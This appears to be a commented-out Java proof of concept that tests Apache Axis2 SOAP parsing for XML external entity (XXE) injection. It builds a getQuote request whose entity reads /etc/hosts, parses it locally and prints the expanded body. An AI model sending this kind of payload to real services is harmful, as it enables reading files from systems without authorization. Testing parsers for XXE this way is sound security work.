//package org.example;
//
//import org.apache.axis2.context.MessageContext;
//import org.apache.axis2.engine.MessageReceiver;
//import org.apache.axis2.receivers.AbstractInMessageReceiver;
//import org.apache.axis2.AxisFault;
//import org.apache.axiom.om.OMElement;
//import org.apache.axiom.soap.impl.builder.StAXSOAPModelBuilder;
//
//import javax.xml.stream.XMLInputFactory;
//import javax.xml.stream.XMLStreamException;
//import javax.xml.stream.XMLStreamReader;
//import java.io.StringReader;
//
//public class ApacheAxisAttack {
//    public static void main(String[] args) throws XMLStreamException, AxisFault {
//        String payload =
//                """
//                        <!DOCTYPE getQuote [
//                         <!ENTITY file SYSTEM "/etc/hosts">
//                        ]>
//                        <getQuote xmlns="http://services.samples">
//                         <request>
//                         <symbol xmlns="http://services.samples/xsd">&file;</symbol>
//                         </request>
//                        </getQuote>""";
//
//        MessageContext messageContext = new MessageContext();
//        XMLInputFactory factory = XMLInputFactory.newInstance();
//        XMLStreamReader reader = factory.createXMLStreamReader(new StringReader(payload));
//
//        StAXSOAPModelBuilder builder = new StAXSOAPModelBuilder(reader);
//        messageContext.setEnvelope(builder.getSOAPEnvelope());
//
//        MessageReceiver receiver = new AbstractInMessageReceiver() {
//            @Override
//            public void invokeBusinessLogic(MessageContext msgCtx) {
//                OMElement bodyElement = msgCtx.getEnvelope().getBody().getFirstElement();
//                System.out.println("Processed body: " + bodyElement.toString());
//            }
//        };
//
//        receiver.receive(messageContext);
//    }
//}